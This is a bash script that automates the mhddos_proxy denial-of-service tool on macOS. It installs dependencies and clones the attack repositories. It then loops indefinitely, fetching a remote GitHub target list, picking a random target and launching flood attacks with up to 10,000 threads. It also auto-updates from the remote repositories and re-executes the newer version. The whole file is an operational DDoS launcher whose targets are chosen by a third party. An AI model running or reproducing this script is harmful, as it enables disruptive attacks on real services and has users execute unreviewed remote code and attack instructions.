#!/bin/bash

#check update

set -e

#Just in case kill previous copy of mhddos_proxy
echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with ddos"
pkill -f runner.py || true
pkill -f finder.py || true
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with ddos killed\033[0;0m\n"

num=$(brew --version | grep -E -c "3.4|3.5" || true)
echo -e "$num"
if ((num == 1));
then	
	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Brew is the latest version"
else
	/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
	echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> /Users/${USER}/.zprofile
	eval "$(/opt/homebrew/bin/brew shellenv)"
fi

brew install coreutils git python@3.10
brew link --overwrite python@3.10
python3.10 -m pip install --upgrade pip

cd ~
rm -rf auto_mhddos_mac
git clone https://github.com/alexnest-ua/auto_mhddos_mac
rm -rf mhddos_proxy
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy
cd ~/mhddos_proxy
echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling latest requirements...\033[0;0m\n\n"
sleep 2
python3.10 -m pip install -r requirements.txt

restart_interval="1200"

ulimit -n 1048576 || true

threads="${1:-2000}"
if ((threads < 1000));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads - attack will be started with 1000 threads\033[0;0m\n"
	threads=1000
elif ((threads > 10000));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads - attack will be started with 10000 threads\033[0;0m\n"
	threads=10000
fi

rpc="${2:-1000}"

debug="${3:-}"
if [ "${debug}" != "--debug" ] && [ "${debug}" != "" ] && [ "${debug}" != "--vpn" ];
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mStarting with parameter --debug (--table is not supported in our script)\033[0;0m\n"
	debug="--debug"
fi

vpn="${4:-}"
if [ "${vpn}" != "--vpn" ] && [ "${vpn}" != "" ];
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mStarting with parameter --vpn\033[0;0m\n"
	vpn="--vpn"
fi

echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters:  -t $threads --rpc $rpc $debug $vpn...\033[1;0m"
sleep 7

trap 'echo signal received!; kill "${PID}"; wait "${PID}"; ctrl_c' SIGINT SIGTERM

function ctrl_c() {
        echo "Exiting..."
	sleep 3s
	exit
	echo "Exiting failed - close the window with terminal!!!"
	sleep 60s
}

# Restarts attacks and update targets list every 20 minutes
while [ 1 == 1 ]
do	
	cd ~/mhddos_proxy

	num0=$(git pull origin main | grep -E -c 'Already|Уже|Вже')
   	echo -e "$num0"
   	
   	if ((num0 == 1));
	then
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date mhddos_proxy"
	else
		python3.10 -m pip install -r requirements.txt
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated mhddos_proxy"
		sleep 3
	fi
	
	cd ~/auto_mhddos_mac
   	num=$(git pull origin main | grep -E -c 'Already|Уже|Вже')
   	echo -e "$num"
   	
   	if ((num == 1));
   	then	
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date auto_mhddos_alexnest"
	else
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated auto_mhddos_alexnest"
		bash runner.sh $num_of_copies $threads $rpc $debug $vpn& # run new downloaded script 
		exit #terminate old script
	fi
   	
	sleep 3

   	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | grep "^[^#]" | wc -l | tr -d " |\n")

	i=$(shuf -i 1-$list_size -n 1)
      
   	echo -e "\n I = $i"
    	# Filter and only get lines that not start with "#". Then get one target from that filtered list.
    	cmd_line=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | grep "^[^#]" | awk "NR==$i")
           
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
    	echo -e "python3 runner.py $cmd_line --rpc $rpc -t $threads $vpn $debug"
            
	cd ~/mhddos_proxy
    	python3.10 runner.py $cmd_line -t $threads $vpn $debug&
	PID="$!"
	sleep 20
	
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"

   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval seconds...\033[1;0m"
	
   	sleep $restart_interval
	clear
   	
   	#Just in case kill previous copy of mhddos_proxy
   	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
   	pkill -f runner.py || true
	pkill -f finder.py || true
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
	
   	no_ddos_sleep=`expr $(shuf -i 1-3 -n 1) \* 60`
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[36mSleeping $no_ddos_sleep seconds without DDoS to let your computer cool down...\033[0m\n"
	sleep $no_ddos_sleep
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mRESTARTING\033[0m\n"
done
